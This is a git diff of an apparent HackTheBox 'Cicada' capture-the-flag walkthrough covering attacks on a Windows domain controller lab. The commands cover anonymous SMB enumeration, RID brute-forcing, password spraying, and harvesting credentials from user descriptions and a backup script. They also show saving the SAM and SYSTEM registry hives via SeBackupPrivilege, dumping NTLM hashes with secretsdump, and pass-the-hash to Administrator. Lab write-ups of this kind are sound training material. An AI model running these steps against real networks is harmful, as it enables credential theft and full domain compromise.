@@ -7,29 +7,22 @@ tags: ["active directory", "hackthebox", "windows"]
 ---
 
 
-# HackTheBox Machine Walkthrough
-
-This document provides a structured, detailed walkthrough of the HackTheBox machine, from initial enumeration through privilege escalation to Domain Admin. All commands, outputs, and notes are presented in organized Markdown.
-
----
+# Cicada Walkthrough
 
 ## 1. Initial Nmap Enumeration
 
 Identify open ports and services on the target.
 
 ```bash
-# Discover all TCP ports
-nmap -sC -sV -oN nmap_initial.txt 10.10.11.35
+# Discover some TCP ports
+nmap -sVC -T4 10.10.11.35 -oA nmapScan-out
 ```
+
+
 
 **Key findings:**
 
-| Port | Service      | Version             |
-| ---- | ------------ | ------------------- |
-| 22   | ssh          | OpenSSH 8.x         |
-| 80   | http         | Apache 2.4.x        |
-| 139  | netbios-ssn  | Windows netbios-ssn |
-| 445  | microsoft-ds | Windows Server SMB  |
+![nmap](/images/cicada-nmap.png)
 
 ---
 
@@ -41,43 +34,55 @@ nmap -sC -sV -oN nmap_initial.txt 10.10.11.35
 smbclient -L 10.10.11.35 -N
 ```
 
+![anony](/images/cicada-smbanony.png)
+
 - `HR` share is accessible.
 
-### 2.2 Download `info.txt` from HR share
+### 2.2 Download `Notice from HR.txt` from HR share
 
 ```bash
-smbclient \\10.10.11.35\HR -N
-> get info.txt
+smbclient //10.10.11.35/HR -N
+> ls
+> mget *
 ```
 
-> **Discovery:** The file contains a password: `Welcome@123`
+![anony](/images/cicida-HR-ls2.png)
+
+Checking out the content:
+![anony](/images/cicada-firstpass.png)
+
+> **Discovery:** The file contains a password: `Cicada$M6Corpb*@Lp#nZp!8`
 
 ---
 
 ## 3. RID Brute-Force to Enumerate Users
 
-Use NetExec (`nxc`) to perform RID cycling without credentials.
+Using NetExec (`nxc`) to perform RID brute force without credentials.
 
 ```bash
 nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute
 ```
 
+![rid brute](/images/cicada-ridbrute.png)
+
 Filter only user accounts and save to `users.txt`:
 
 ```bash
-nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute \
-  | grep 'Found:' | awk '{print $NF}' > users.txt
+nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute | grep "SidTypeUser" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
+
 ```
 
 ---
 
 ## 4. Password Spraying with Valid Users
 
-Perform a password spray using the discovered password `Welcome@123` against the user list.
+Perform a password spray using the discovered password `Cicada$M6Corpb*@Lp#nZp!8` against the user list.
 
 ```bash
-nxc smb 10.10.11.35 -u users.txt -p 'Welcome@123' --valid
+nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
+
+![spray](/images/cicada-spray.png)
 
 > **Success:** Credentials for `michael.wrightson` found.
 
@@ -88,76 +93,60 @@ nxc smb 10.10.11.35 -u users.txt -p 'Welcome@123' --valid
 Try to get a shell via WinRM using the valid credentials.
 
 ```bash
-evil-winrm -i 10.10.11.35 -u michael.wrightson -p 'Welcome@123'
+evil-winrm -i 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
-
 > **Result:** Access denied.
 
 ---
 
-## 6. Check Additional SMB Shares
-
-List shares with authenticated user.
+## 6. Check Additional Users with valid credentials
 
 ```bash
-smbclient -L \\10.10.11.35 -U michael.wrightson
+nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 ```
+![find users](/images/cicada-users.png)
 
-- `DEV` share discovered, but no access via SMB.
+> **Discovery:** User `david.orelious` found with the password `aRt$Lp#7t*VQ!3` on his description.
+
+
+## 7. List shares with the new user
+
+Initially, we identified a DEV share, but access was denied. Let's try with the new user:
+
+```bash
+smbclient //10.10.11.35/DEV -U david.orelious
+> aRt$Lp#7t*VQ!3
+> dir
+> mget *
+```
+![dev share](/images/cicada-dev.png)
+
+![backup file](/images/cicada-backupfile.png)
+
+**Discovery:** Powershell backup file with new credentials `emily.oscars:Q!3@Lp#M6b*7t*Vt`.
 
 ---
 
-## 7. Further User Enumeration
 
-Use NetExec with valid creds to find other user accounts.
+## 9. WinRM Access with New User Account
 
 ```bash
-nxc smb 10.10.11.35 -u michael.wrightson -p 'Welcome@123' --users
+evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 ```
 
-> **Found:** `evil-winrm` user with password in description.
+> **Success:** Shell as `emily.oscars`.
 
 ---
 
-## 8. Access DEV Share and Retrieve Script
-
-### 8.1 Mount DEV share
-
-```bash
-smbclient \\10.10.11.35\DEV -U evil-winrm
-> get deploy_script.ps1
-```
-
-### 8.2 Inspect `deploy_script.ps1`
-
-```powershell
-# deploy_script.ps1 (excerpt)
-$creds = New-Object System.Management.Automation.PSCredential(
-    'svc_deploy', (ConvertTo-SecureString 'D3ployP@ss!' -AsPlainText -Force)
-)
-```
-
-> **New credential discovered:** `svc_deploy:D3ployP@ss!`
-
----
-
-## 9. WinRM Access with New Service Account
-
-```bash
-evil-winrm -i 10.10.11.35 -u svc_deploy -p 'D3ployP@ss!'
-```
-
-> **Success:** Shell as `svc_deploy`.
-
----
-
-## 10. Privilege Enumeration
+## 10. Privilege Escalation
 
 Check current privileges:
 
 ```powershell
 whoami /priv
 ```
+
+![privesc](/images/cicada-priv.png)
 
 > **SeBackupPrivilege** is `Enabled`.
 
@@ -172,35 +161,32 @@ whoami /priv
 mkdir C:\temp
 
 # Save registry hives
-reg save HKLM\SAM C:\temp\SAM
-reg save HKLM\SYSTEM C:\temp\SYSTEM
+reg save HKLM\SAM C:\temp\sam
+reg save HKLM\SYSTEM C:\temp\system
+
+# Download files with "download" from evil-winrm
+download sam
+download system
 ```
 
 ### 11.2 Extract NTLM hashes offline
 
-Copy the dumps to your attacking machine and run:
-
 ```bash
-secretsdump.py -sam SAM -system SYSTEM LOCAL > hashes.txt
+impacket-secretsdump -sam sam -system system LOCAL > hashes.txt
 ```
+![dump hashes](/images/cicada-hash.png)
 
 ### 11.3 Pass-the-Hash to Domain Controller
 
 Use Evil-WinRM with the extracted Administrator NTLM hash:
 
 ```bash
-evil-winrm -i 10.10.11.35 -u Administrator -H <ADMIN_NTLM_HASH>
+evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
 ```
+![alt text](/images/cicada-admin.png)
+
 
 > **Result:** Shell as **Domain Administrator** on the DC.
-
----
-
-## 12. Conclusion
-
-- **User**: `svc_deploy` via discovered service credential.
-- **Escalation**: `SeBackupPrivilege` → dump hives → extract hashes → PtH.
-- **Final**: Domain Administrator access achieved.
 
 ---
 
